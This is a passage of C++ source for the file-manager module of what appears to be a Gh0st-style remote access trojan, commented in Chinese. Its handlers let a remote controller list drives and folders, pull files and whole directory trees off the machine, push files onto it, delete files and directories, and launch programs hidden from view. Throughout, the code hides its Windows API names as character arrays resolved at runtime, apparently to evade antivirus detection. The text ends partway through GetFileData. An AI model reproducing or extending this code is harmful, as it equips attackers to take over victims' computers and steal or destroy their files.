// FileManager.cpp: implementation of the CFileManager class.
//
//////////////////////////////////////////////////////////////////////
#include "../StdAfx.h"
#include "../Declare.h"   //动态调用库函数
#include "FileManager.h"
#include "../Myfunction.h"  //自定义函数

extern Myfunction *Gyfunction;

typedef struct 
{
	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
}FILESIZE;
//////////////////////////////////////////////////////////////////////

//////////////////////////////////////////////////////////////////////

CFileManager::CFileManager(CClientSocket *pClient):CManager(pClient)
{
	m_nTransferMode = TRANSFER_MODE_NORMAL;
	// 发送驱动器列表, 开始进行文件管理，建立新线程
	SendDriveList();
}

CFileManager::~CFileManager()
{
	m_UploadList.clear();
}

void CFileManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	char BrmAP01[] = {'D','e','l','e','t','e','F','i','l','e','A','\0'};
	DeleteFileAT pDeleteFileA=(DeleteFileAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP01);
	switch (lpBuffer[0])
	{
	case COMMAND_LIST_FILES:// 获取文件列表
		SendFilesList((char *)lpBuffer + 1);
		break;
	case COMMAND_DELETE_FILE:// 删除文件
		pDeleteFileA((char *)lpBuffer + 1);
		SendToken(TOKEN_DELETE_FINISH);
		break;
	case COMMAND_DELETE_DIRECTORY:// 删除文件
		DeleteDirectory((char *)lpBuffer + 1);
		SendToken(TOKEN_DELETE_FINISH);
		break;
	case COMMAND_DOWN_FILES: // 上传文件
		UploadToRemote(lpBuffer + 1);
		break;
	case COMMAND_CONTINUE: // 上传文件
		SendFileData(lpBuffer + 1);
		break;
	case COMMAND_CREATE_FOLDER:
		CreateFolder(lpBuffer + 1);
		break;
	case COMMAND_RENAME_FILE:  //文件改名
		Rename(lpBuffer + 1);
		break;
	case COMMAND_STOP:
		StopTransfer();
		break;
	case COMMAND_SET_TRANSFER_MODE:
		SetTransferMode(lpBuffer + 1);
		break;
	case COMMAND_FILE_SIZE:
		CreateLocalRecvFile(lpBuffer + 1);
		break;
	case COMMAND_FILE_DATA:
		WriteLocalRecvFile(lpBuffer + 1, nSize -1);
		break;
	case COMMAND_OPEN_FILE_SHOW:
		OpenFile((char *)lpBuffer + 1, SW_SHOW);
		break;
	case COMMAND_OPEN_FILE_HIDE:
		OpenFile((char *)lpBuffer + 1, SW_HIDE);
		break;
	default:
		break;
	}
}


bool CFileManager::MakeSureDirectoryPathExists(LPCTSTR pszDirPath)
{
    LPTSTR p, pszDirCopy;
    DWORD dwAttributes;

    // Make a copy of the string for editing.
	char BrmAP02[] = {'C','r','e','a','t','e','D','i','r','e','c','t','o','r','y','A','\0'};
    CreateDirectoryAT pCreateDirectoryA=(CreateDirectoryAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP02);
	char FBwWp01[] = {'l','s','t','r','l','e','n','A','\0'};
	lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp01);
	char FBwWp06[] = {'G','e','t','L','a','s','t','E','r','r','o','r','\0'};
	GetLastErrorT pGetLastError=(GetLastErrorT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp06);
	char FBwWp22[] = {'l','s','t','r','c','p','y','A','\0'};
	lstrcpyAT plstrcpyA=(lstrcpyAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp22);
    __try
    {
        pszDirCopy = (LPTSTR)malloc(sizeof(TCHAR) * (plstrlenA(pszDirPath) + 1));

        if(pszDirCopy == NULL)
            return FALSE;

        plstrcpyA(pszDirCopy, pszDirPath);

        p = pszDirCopy;

        //  If the second character in the path is "\", then this is a UNC
        //  path, and we should skip forward until we reach the 2nd \ in the path.

		char DYrEN51[] = {'C','h','a','r','N','e','x','t','A','\0'};
		CharNextAT pCharNextA=(CharNextAT)GetProcAddress(LoadLibrary("USER32.dll"),DYrEN51);
        if((*p == TEXT('\\')) && (*(p+1) == TEXT('\\')))
        {
            p++;            // Skip over the first \ in the name.
            p++;            // Skip over the second \ in the name.

            //  Skip until we hit the first "\" (\\Server\).

            while(*p && *p != TEXT('\\'))
            {
                p = pCharNextA(p);
            }

            // Advance over it.

            if(*p)
            {
                p++;
            }

            //  Skip until we hit the second "\" (\\Server\Share\).

            while(*p && *p != TEXT('\\'))
            {
                p = pCharNextA(p);
            }

            // Advance over it also.

            if(*p)
            {
                p++;
            }

        }
        else if(*(p+1) == TEXT(':')) // Not a UNC.  See if it's <drive>:
        {
            p++;
            p++;

            // If it exists, skip over the root specifier

            if(*p && (*p == TEXT('\\')))
            {
                p++;
            }
        }

		char FBwWp06[] = {'G','e','t','F','i','l','e','A','t','t','r','i','b','u','t','e','s','A','\0'};
		GetFileAttributesAT pGetFileAttributesA=(GetFileAttributesAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp06);
		while(*p)
        {
            if(*p == TEXT('\\'))
            {
                *p = TEXT('\0');
                dwAttributes = pGetFileAttributesA(pszDirCopy);

                // Nothing exists with this name.  Try to make the directory name and error if unable to.
                if(dwAttributes == 0xffffffff)
                {
                    if(!pCreateDirectoryA(pszDirCopy, NULL))
                    {
                        if(pGetLastError() != ERROR_ALREADY_EXISTS)
                        {
                            free(pszDirCopy);
                            return FALSE;
                        }
                    }
                }
                else
                {
                    if((dwAttributes & FILE_ATTRIBUTE_DIRECTORY) != FILE_ATTRIBUTE_DIRECTORY)
                    {
                        // Something exists with this name, but it's not a directory... Error
                        free(pszDirCopy);
                        return FALSE;
                    }
                }
 
                *p = TEXT('\\');
            }

            p = pCharNextA(p);
        }
    }
    __except(EXCEPTION_EXECUTE_HANDLER)
    {
        // SetLastError(GetExceptionCode());
        free(pszDirCopy);
        return FALSE;
    }

    free(pszDirCopy);
    return TRUE;
}
bool CFileManager::OpenFile(LPCTSTR lpFile, INT nShowCmd)
{
	char	lpSubKey[500];
	HKEY	hKey;
	char	strTemp[MAX_PATH];
	LONG	nSize = sizeof(strTemp);
	char	*lpstrCat = NULL;
	memset(strTemp, 0, sizeof(strTemp));
	
	const char	*lpExt = strrchr(lpFile, '.');
	if (!lpExt)
		return false;
	
	char HrFvD08[] = {'R','e','g','O','p','e','n','K','e','y','E','x','A','\0'};
    RegOpenKeyExAT pRegOpenKeyExA=(RegOpenKeyExAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD08);
	if (pRegOpenKeyExA(HKEY_CLASSES_ROOT, lpExt, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return false;

	char HrFvD07[] = {'R','e','g','Q','u','e','r','y','V','a','l','u','e','A','\0'};
	RegQueryValueAT pRegQueryValueA=(RegQueryValueAT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD07);
	pRegQueryValueA(hKey, NULL, strTemp, &nSize);

	char HrFvD06[] = {'R','e','g','C','l','o','s','e','K','e','y','\0'};
	RegCloseKeyT pRegCloseKey=(RegCloseKeyT)GetProcAddress(LoadLibrary("ADVAPI32.dll"),HrFvD06);
	pRegCloseKey(hKey);
	memset(lpSubKey, 0, sizeof(lpSubKey));

    char CtxPW50[] = {'w','s','p','r','i','n','t','f','A','\0'};
    wsprintfAT pwsprintfA=(wsprintfAT)GetProcAddress(LoadLibrary("USER32.dll"),CtxPW50);
	char DYrEN31[] = {'%','s','\\','s','h','e','l','l','\\','o','p','e','n','\\','c','o','m','m','a','n','d','\0'};
	pwsprintfA(lpSubKey, DYrEN31, strTemp);
	
	if (pRegOpenKeyExA(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
		return false;
	memset(strTemp, 0, sizeof(strTemp));
	nSize = sizeof(strTemp);
	pRegQueryValueA(hKey, NULL, strTemp, &nSize);
	pRegCloseKey(hKey);
	
	lpstrCat = Gyfunction->my_strstr(strTemp, "\"%1");
	if (lpstrCat == NULL)
		lpstrCat = Gyfunction->my_strstr(strTemp, "%1");
	
	char DmDjm01[] = {'l','s','t','r','c','a','t','A','\0'};
	lstrcatAT plstrcatA=(lstrcatAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),DmDjm01);
	char FBwWp22[] = {'l','s','t','r','c','p','y','A','\0'};
	lstrcpyAT plstrcpyA=(lstrcpyAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp22);
	if (lpstrCat == NULL)
	{
		plstrcatA(strTemp, " ");
		plstrcatA(strTemp, lpFile);
	}
	else
		plstrcpyA(lpstrCat, lpFile);
	
	STARTUPINFO si = {0};
	PROCESS_INFORMATION pi;
	si.cb = sizeof si;
	if (nShowCmd != SW_HIDE)
		si.lpDesktop = "WinSta0\\Default"; 
	
	char BrmAP30[] = {'C','r','e','a','t','e','P','r','o','c','e','s','s','A','\0'};
	CreateProcessAT pCreateProcessA=(CreateProcessAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP30);
	pCreateProcessA(NULL, strTemp, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
	return false;
}
UINT CFileManager::SendDriveList()
{
	char	DriveString[256];
	// 前一个字节为令牌，后面的52字节为驱动器跟相关属性
	BYTE	DriveList[1024];
	char	FileSystem[MAX_PATH];
	char	*pDrive = NULL;
	DriveList[0] = TOKEN_DRIVE_LIST; // 驱动器列表
	char DYrEN30[] = {'G','e','t','L','o','g','i','c','a','l','D','r','i','v','e','S','t','r','i','n','g','s','A','\0'};
	GetLogicalDriveStringsAT pGetLogicalDriveStringsA=(GetLogicalDriveStringsAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),DYrEN30);
	pGetLogicalDriveStringsA(sizeof(DriveString), DriveString);
	pDrive = DriveString;

	unsigned __int64	HDAmount = 0;
	unsigned __int64	HDFreeSpace = 0;
	unsigned long		AmntMB = 0; // 总大小
	unsigned long		FreeMB = 0; // 剩余空间

	DWORD dwOffset;

	char FBwWp01[] = {'l','s','t','r','l','e','n','A','\0'};
	lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp01);
	for (dwOffset = 1; *pDrive != '\0'; pDrive += plstrlenA(pDrive) + 1)
	{
		memset(FileSystem, 0, sizeof(FileSystem));
		// 得到文件系统信息及大小
		char FBwWp10[] = {'G','e','t','V','o','l','u','m','e','I','n','f','o','r','m','a','t','i','o','n','A','\0'};
		GetVolumeInformationAT pGetVolumeInformationA=(GetVolumeInformationAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp10);
		pGetVolumeInformationA(pDrive, NULL, 0, NULL, NULL, NULL, FileSystem, MAX_PATH);
		SHFILEINFO	sfi;

		char CtxPW40[] = {'S','H','G','e','t','F','i','l','e','I','n','f','o','A','\0'};
		SHGetFileInfoAT pSHGetFileInfoA=(SHGetFileInfoAT)GetProcAddress(LoadLibrary("SHELL32.dll"),CtxPW40);
		pSHGetFileInfoA(pDrive, FILE_ATTRIBUTE_NORMAL, &sfi, sizeof(SHFILEINFO), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);
		
		int	nTypeNameLen = plstrlenA(sfi.szTypeName) + 1;
		int	nFileSystemLen = plstrlenA(FileSystem) + 1;
		
		// 计算磁盘大小
		char FBwWp09[] = {'G','e','t','D','i','s','k','F','r','e','e','S','p','a','c','e','E','x','A','\0'};
		GetDiskFreeSpaceExAT pGetDiskFreeSpaceExA=(GetDiskFreeSpaceExAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp09);
		if (pDrive[0] != 'A' && pDrive[0] != 'B' && pGetDiskFreeSpaceExA(pDrive, (PULARGE_INTEGER)&HDFreeSpace, (PULARGE_INTEGER)&HDAmount, NULL))
		{	
			AmntMB = HDAmount / 1024 / 1024;
			FreeMB = HDFreeSpace / 1024 / 1024;
		}
		else
		{
			AmntMB = 0;
			FreeMB = 0;
		}
		// 开始赋值
		DriveList[dwOffset] = pDrive[0];
		char FBwWp07[] = {'G','e','t','D','r','i','v','e','T','y','p','e','A','\0'};
		GetDriveTypeAT pGetDriveTypeA=(GetDriveTypeAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp07);
		DriveList[dwOffset + 1] = pGetDriveTypeA(pDrive);
		
		
		// 磁盘空间描述占去了8字节
		Gyfunction->my_memcpy(DriveList + dwOffset + 2, &AmntMB, sizeof(unsigned long));
		Gyfunction->my_memcpy(DriveList + dwOffset + 6, &FreeMB, sizeof(unsigned long));
		
		// 磁盘卷标名及磁盘类型
		Gyfunction->my_memcpy(DriveList + dwOffset + 10, sfi.szTypeName, nTypeNameLen);
		Gyfunction->my_memcpy(DriveList + dwOffset + 10 + nTypeNameLen, FileSystem, nFileSystemLen);
		
		dwOffset += 10 + nTypeNameLen + nFileSystemLen;
	}

	return Send((LPBYTE)DriveList, dwOffset);
}


UINT CFileManager::SendFilesList(LPCTSTR lpszDirectory)
{
	// 重置传输方式
	m_nTransferMode = TRANSFER_MODE_NORMAL;	

	UINT	nRet = 0;
	char	strPath[MAX_PATH];
	char	*pszFileName = NULL;
	LPBYTE	lpList = NULL;
	HANDLE	hFile;
	DWORD	dwOffset = 0; // 位移指针
	int		nLen = 0;
	DWORD	nBufferSize =  1024 * 10; // 先分配10K的缓冲区
	WIN32_FIND_DATA	FindFileData;
	
	char SSzlC20[] = {'L','o','c','a','l','A','l','l','o','c','\0'};
	LocalAllocT pLocalAlloc=(LocalAllocT)GetProcAddress(LoadLibrary("KERNEL32.dll"),SSzlC20);
	lpList = (BYTE *)pLocalAlloc(LPTR, nBufferSize);
	
    char CtxPW50[] = {'w','s','p','r','i','n','t','f','A','\0'};
    wsprintfAT pwsprintfA=(wsprintfAT)GetProcAddress(LoadLibrary("USER32.dll"),CtxPW50);
	pwsprintfA(strPath, "%s\\*.*", lpszDirectory);

	char Wffkl11[] = {'F','i','n','d','F','i','r','s','t','F','i','l','e','A','\0'};
	FindFirstFileAT pFindFirstFileA=(FindFirstFileAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),Wffkl11);
	hFile = pFindFirstFileA(strPath, &FindFileData);

	if (hFile == INVALID_HANDLE_VALUE)
	{
		BYTE bToken = TOKEN_FILE_LIST;
		return Send(&bToken, 1);
	}
	
	*lpList = TOKEN_FILE_LIST;
	
	// 1 为数据包头部所占字节,最后赋值
	dwOffset = 1;
	/*
	文件属性	1
	文件名		strlen(filename) + 1 ('\0')
	文件大小	4
	*/
	char FBwWp01[] = {'l','s','t','r','l','e','n','A','\0'};
	lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp01);
	FindNextFileAT pFindNextFileA=(FindNextFileAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"FindNextFileA");
	do 
	{
		// 动态扩展缓冲区
		char FBwWp29[] = {'L','o','c','a','l','R','e','A','l','l','o','c','\0'};
		LocalReAllocT pLocalReAlloc=(LocalReAllocT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp29);
		if (dwOffset > (nBufferSize - MAX_PATH * 2))
		{
			nBufferSize += MAX_PATH * 2;
			lpList = (BYTE *)pLocalReAlloc(lpList, nBufferSize, LMEM_ZEROINIT|LMEM_MOVEABLE);
		}
		pszFileName = FindFileData.cFileName;
		if (strcmp(pszFileName, ".") == 0 || strcmp(pszFileName, "..") == 0)
			continue;
		// 文件属性 1 字节
		*(lpList + dwOffset) = FindFileData.dwFileAttributes &	FILE_ATTRIBUTE_DIRECTORY;
		dwOffset++;
		// 文件名 lstrlen(pszFileName) + 1 字节
		nLen = plstrlenA(pszFileName);
		Gyfunction->my_memcpy(lpList + dwOffset, pszFileName, nLen);
		dwOffset += nLen;
		*(lpList + dwOffset) = 0;
		dwOffset++;
		
		// 文件大小 8 字节
		Gyfunction->my_memcpy(lpList + dwOffset, &FindFileData.nFileSizeHigh, sizeof(DWORD));
		Gyfunction->my_memcpy(lpList + dwOffset + 4, &FindFileData.nFileSizeLow, sizeof(DWORD));
		dwOffset += 8;
		// 最后访问时间 8 字节
		Gyfunction->my_memcpy(lpList + dwOffset, &FindFileData.ftLastWriteTime, sizeof(FILETIME));
		dwOffset += 8;
	} while(pFindNextFileA(hFile, &FindFileData));

	nRet = Send(lpList, dwOffset);

	char DYrEN31[] = {'L','o','c','a','l','F','r','e','e','\0'};
	LocalFreeT pLocalFree=(LocalFreeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),DYrEN31);
	pLocalFree(lpList);
	char FBwWp27[] = {'F','i','n','d','C','l','o','s','e','\0'};
	FindCloseT pFindClose=(FindCloseT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp27);
	pFindClose(hFile);
	return nRet;
}


bool CFileManager::DeleteDirectory(LPCTSTR lpszDirectory)
{
	WIN32_FIND_DATA	wfd;
	char	lpszFilter[MAX_PATH];
	
    char CtxPW50[] = {'w','s','p','r','i','n','t','f','A','\0'};
    wsprintfAT pwsprintfA=(wsprintfAT)GetProcAddress(LoadLibrary("USER32.dll"),CtxPW50);
	pwsprintfA(lpszFilter, "%s\\*.*", lpszDirectory);
	
	char Wffkl11[] = {'F','i','n','d','F','i','r','s','t','F','i','l','e','A','\0'};
	FindFirstFileAT pFindFirstFileA=(FindFirstFileAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),Wffkl11);
	HANDLE hFind = pFindFirstFileA(lpszFilter, &wfd);
	if (hFind == INVALID_HANDLE_VALUE) // 如果没有找到或查找失败
		return FALSE;
	FindNextFileAT pFindNextFileA=(FindNextFileAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"FindNextFileA");
	char BrmAP01[] = {'D','e','l','e','t','e','F','i','l','e','A','\0'};
	DeleteFileAT pDeleteFileA=(DeleteFileAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP01);
	char DQeBW01[] = {'%','s','\\','%','s','\0'};
	do
	{
		if (wfd.cFileName[0] != '.')
		{
			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				char strDirectory[MAX_PATH];
				pwsprintfA(strDirectory, DQeBW01, lpszDirectory, wfd.cFileName);
				DeleteDirectory(strDirectory);
			}
			else
			{
				char strFile[MAX_PATH];
				pwsprintfA(strFile, DQeBW01, lpszDirectory, wfd.cFileName);
				pDeleteFileA(strFile);
			}
		}
	} while (pFindNextFileA(hFind, &wfd));
	
	char FBwWp27[] = {'F','i','n','d','C','l','o','s','e','\0'};
	FindCloseT pFindClose=(FindCloseT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp27);
	pFindClose(hFind); // 关闭查找句柄
	
	char Wffkl10[] = {'R','e','m','o','v','e','D','i','r','e','c','t','o','r','y','A','\0'};
	RemoveDirectoryAT pRemoveDirectoryA=(RemoveDirectoryAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),Wffkl10);
	if(!pRemoveDirectoryA(lpszDirectory))
	{
		return FALSE;
	}
	return true;
}



UINT CFileManager::SendFileSize(LPCTSTR lpszFileName)
{
	UINT	nRet = 0;
	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
	// 1 字节token, 8字节大小, 文件名称, '\0'
	HANDLE	hFile;
	// 保存当前正在操作的文件名
	memset(m_strCurrentProcessFileName, 0, sizeof(m_strCurrentProcessFileName));
	strcpy(m_strCurrentProcessFileName, lpszFileName);

	  char Wffkl08[] = {'C','r','e','a','t','e','F','i','l','e','A','\0'};
	  CreateFileAT pCreateFileA=(CreateFileAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),Wffkl08);
	hFile = pCreateFileA(lpszFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE)
		return FALSE;
	char Wffkl09[] = {'G','e','t','F','i','l','e','S','i','z','e','\0'};
	GetFileSizeT pGetFileSize=(GetFileSizeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),Wffkl09);
	dwSizeLow =	pGetFileSize(hFile, &dwSizeHigh);
	char BrmAP29[] = {'C','l','o','s','e','H','a','n','d','l','e','\0'};
	CloseHandleT pCloseHandle=(CloseHandleT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP29);
	pCloseHandle(hFile);
	// 构造数据包，发送文件长度
	char FBwWp01[] = {'l','s','t','r','l','e','n','A','\0'};
	lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp01);
	int		nPacketSize = plstrlenA(lpszFileName) + 10;

	char SSzlC20[] = {'L','o','c','a','l','A','l','l','o','c','\0'};
	LocalAllocT pLocalAlloc=(LocalAllocT)GetProcAddress(LoadLibrary("KERNEL32.dll"),SSzlC20);
	BYTE	*bPacket = (BYTE *)pLocalAlloc(LPTR, nPacketSize);
	memset(bPacket, 0, nPacketSize);
	
	bPacket[0] = TOKEN_FILE_SIZE;
	FILESIZE *pFileSize = (FILESIZE *)(bPacket + 1);
	pFileSize->dwSizeHigh = dwSizeHigh;
	pFileSize->dwSizeLow = dwSizeLow;
	Gyfunction->my_memcpy(bPacket + 9, lpszFileName, plstrlenA(lpszFileName) + 1);

	nRet = Send(bPacket, nPacketSize);
	char DYrEN31[] = {'L','o','c','a','l','F','r','e','e','\0'};
	LocalFreeT pLocalFree=(LocalFreeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),DYrEN31);
	pLocalFree(bPacket);
	return nRet;
}

UINT CFileManager::SendFileData(LPBYTE lpBuffer)
{
	UINT		nRet;
	FILESIZE	*pFileSize;
	char		*lpFileName;

	pFileSize = (FILESIZE *)lpBuffer;
	lpFileName = m_strCurrentProcessFileName;

	// 远程跳过，传送下一个
	if (pFileSize->dwSizeLow == -1)
	{
		UploadNext();
		return 0;
	}
	HANDLE	hFile;

	  char Wffkl08[] = {'C','r','e','a','t','e','F','i','l','e','A','\0'};
	  CreateFileAT pCreateFileA=(CreateFileAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),Wffkl08);
	hFile = pCreateFileA(lpFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE)
		return -1;

	char Wffkl05[] = {'S','e','t','F','i','l','e','P','o','i','n','t','e','r','\0'};
	SetFilePointerT pSetFilePointer=(SetFilePointerT)GetProcAddress(LoadLibrary("KERNEL32.dll"),Wffkl05);
	pSetFilePointer(hFile, pFileSize->dwSizeLow, (long *)&(pFileSize->dwSizeHigh), FILE_BEGIN);

	int		nHeadLength = 9; // 1 + 4 + 4数据包头部大小
	DWORD	nNumberOfBytesToRead = MAX_SEND_BUFFER - nHeadLength;
	DWORD	nNumberOfBytesRead = 0;

	char SSzlC20[] = {'L','o','c','a','l','A','l','l','o','c','\0'};
	LocalAllocT pLocalAlloc=(LocalAllocT)GetProcAddress(LoadLibrary("KERNEL32.dll"),SSzlC20);
	LPBYTE	lpPacket = (LPBYTE)pLocalAlloc(LPTR, MAX_SEND_BUFFER);
	// Token,  大小，偏移，文件名，数据
	lpPacket[0] = TOKEN_FILE_DATA;
	Gyfunction->my_memcpy(lpPacket + 1, pFileSize, sizeof(FILESIZE));

	char Wffkl06[] = {'R','e','a','d','F','i','l','e','\0'};
    ReadFileT pReadFile=(ReadFileT)GetProcAddress(LoadLibrary("KERNEL32.dll"),Wffkl06);
	pReadFile(hFile, lpPacket + nHeadLength, nNumberOfBytesToRead, &nNumberOfBytesRead, NULL);
	char BrmAP29[] = {'C','l','o','s','e','H','a','n','d','l','e','\0'};
	CloseHandleT pCloseHandle=(CloseHandleT)GetProcAddress(LoadLibrary("KERNEL32.dll"),BrmAP29);
	pCloseHandle(hFile);


	if (nNumberOfBytesRead > 0)
	{
		int	nPacketSize = nNumberOfBytesRead + nHeadLength;
		nRet = Send(lpPacket, nPacketSize);
	}
	else
	{
		UploadNext();
	}

	char DYrEN31[] = {'L','o','c','a','l','F','r','e','e','\0'};
	LocalFreeT pLocalFree=(LocalFreeT)GetProcAddress(LoadLibrary("KERNEL32.dll"),DYrEN31);
	pLocalFree(lpPacket);

	return nRet;
}
// 传送下一个文件
void CFileManager::UploadNext()
{
	list <string>::iterator it = m_UploadList.begin();
	// 删除一个任务
	m_UploadList.erase(it);
	// 还有上传任务
	if(m_UploadList.empty())
	{
		SendToken(TOKEN_TRANSFER_FINISH);
	}
	else
	{
		// 上传下一个
		it = m_UploadList.begin();
		SendFileSize((*it).c_str());
	}
}
int CFileManager::SendToken(BYTE bToken)
{
	return Send(&bToken, 1);
}

bool CFileManager::UploadToRemote(LPBYTE lpBuffer)
{

	char FBwWp01[] = {'l','s','t','r','l','e','n','A','\0'};
	lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp01);
	if (lpBuffer[plstrlenA((char *)lpBuffer) - 1] == '\\')
	{
		FixedUploadList((char *)lpBuffer);
		if (m_UploadList.empty())
		{
			StopTransfer();
			return true;
		}
	}
	else
	{
		m_UploadList.push_back((char *)lpBuffer);
	}

	list <string>::iterator it = m_UploadList.begin();
	// 发送第一个文件
	SendFileSize((*it).c_str());

	return true;
}

bool CFileManager::FixedUploadList(LPCTSTR lpPathName)
{
	WIN32_FIND_DATA	wfd;
	char	lpszFilter[MAX_PATH];
	char	*lpszSlash = NULL;
	memset(lpszFilter, 0, sizeof(lpszFilter));

	char FBwWp01[] = {'l','s','t','r','l','e','n','A','\0'};
	lstrlenAT plstrlenA=(lstrlenAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp01);
	if (lpPathName[plstrlenA(lpPathName) - 1] != '\\')
		lpszSlash = "\\";
	else
		lpszSlash = "";

    char CtxPW50[] = {'w','s','p','r','i','n','t','f','A','\0'};
    wsprintfAT pwsprintfA=(wsprintfAT)GetProcAddress(LoadLibrary("USER32.dll"),CtxPW50);
	pwsprintfA(lpszFilter, "%s%s*.*", lpPathName, lpszSlash);

	char Wffkl11[] = {'F','i','n','d','F','i','r','s','t','F','i','l','e','A','\0'};
	FindFirstFileAT pFindFirstFileA=(FindFirstFileAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),Wffkl11);
	HANDLE hFind = pFindFirstFileA(lpszFilter, &wfd);
	if (hFind == INVALID_HANDLE_VALUE) // 如果没有找到或查找失败
		return false;
	FindNextFileAT pFindNextFileA=(FindNextFileAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"FindNextFileA");

	do
	{
		if (wfd.cFileName[0] != '.')
		{
			if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				char strDirectory[MAX_PATH];
				pwsprintfA(strDirectory, "%s%s%s", lpPathName, lpszSlash, wfd.cFileName);
				FixedUploadList(strDirectory);
			}
			else
			{
				char strFile[MAX_PATH];
				pwsprintfA(strFile, "%s%s%s", lpPathName, lpszSlash, wfd.cFileName);
				m_UploadList.push_back(strFile);
			}
		}
	} while (pFindNextFileA(hFind, &wfd));
	
	char FBwWp27[] = {'F','i','n','d','C','l','o','s','e','\0'};
	FindCloseT pFindClose=(FindCloseT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp27);
	pFindClose(hFind); // 关闭查找句柄
	return true;
}

void CFileManager::StopTransfer()
{
	if (!m_UploadList.empty())
		m_UploadList.clear();
	SendToken(TOKEN_TRANSFER_FINISH);
}

void CFileManager::CreateLocalRecvFile(LPBYTE lpBuffer)
{
	FILESIZE	*pFileSize = (FILESIZE *)lpBuffer;
	// 保存当前正在操作的文件名
	memset(m_strCurrentProcessFileName, 0, sizeof(m_strCurrentProcessFileName));
	strcpy(m_strCurrentProcessFileName, (char *)lpBuffer + 8);

	// 保存文件长度
	DWORDLONG dwHighBase = MAXDWORD;  
    dwHighBase += 1;
	m_nCurrentProcessFileLength = (pFileSize->dwSizeHigh * dwHighBase) + pFileSize->dwSizeLow;
	
	// 创建多层目录
	MakeSureDirectoryPathExists(m_strCurrentProcessFileName);

	WIN32_FIND_DATA FindFileData;

	char Wffkl11[] = {'F','i','n','d','F','i','r','s','t','F','i','l','e','A','\0'};
	FindFirstFileAT pFindFirstFileA=(FindFirstFileAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),Wffkl11);
	HANDLE hFind = pFindFirstFileA(m_strCurrentProcessFileName, &FindFileData);
	
	if (hFind != INVALID_HANDLE_VALUE
		&& m_nTransferMode != TRANSFER_MODE_OVERWRITE_ALL 
		&& m_nTransferMode != TRANSFER_MODE_ADDITION_ALL
		&& m_nTransferMode != TRANSFER_MODE_JUMP_ALL
		)
	{
		SendToken(TOKEN_GET_TRANSFER_MODE);
	}
	else
	{
		GetFileData();
	}
	char FBwWp27[] = {'F','i','n','d','C','l','o','s','e','\0'};
	FindCloseT pFindClose=(FindCloseT)GetProcAddress(LoadLibrary("KERNEL32.dll"),FBwWp27);
	pFindClose(hFind);
}

void CFileManager::GetFileData()
{
	int	nTransferMode;
	switch (m_nTransferMode)
	{
	case TRANSFER_MODE_OVERWRITE_ALL:
		nTransferMode = TRANSFER_MODE_OVERWRITE;
		break;
	case TRANSFER_MODE_ADDITION_ALL:
		nTransferMode = TRANSFER_MODE_ADDITION;
		break;
	case TRANSFER_MODE_JUMP_ALL:
		nTransferMode = TRANSFER_MODE_JUMP;
		break;
	default:
		nTransferMode = m_nTransferMode;
	}
	
	WIN32_FIND_DATA FindFileData;

	char Wffkl11[] = {'F','i','n','d','F','i','r','s','t','F','i','l','e','A','\0'};
	FindFirstFileAT pFindFirstFileA=(FindFirstFileAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),Wffkl11);
	HANDLE hFind = pFindFirstFileA(m_strCurrentProcessFileName, &FindFileData);
	
	//  1字节Token,四字节偏移高四位，四字节偏移低四位
	BYTE	bToken[9];
	DWORD	dwCreationDisposition; // 文件打开方式 
